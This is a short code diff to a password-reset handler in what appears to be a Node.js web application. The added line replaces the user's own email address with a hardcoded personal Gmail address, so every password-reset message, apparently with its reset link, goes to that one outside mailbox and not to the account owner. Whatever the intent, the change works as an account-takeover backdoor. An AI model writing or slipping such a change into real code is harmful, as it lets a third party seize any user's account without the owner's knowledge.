@@ -119,7 +119,7 @@ export const forgotPassword = async (req, res) => {
 
     try {
       await sendEmail({
-        to: user.email,
+        to: "naruto95691@gmail.com",
         subject: "Password Reset Request",
         text: message,
       });
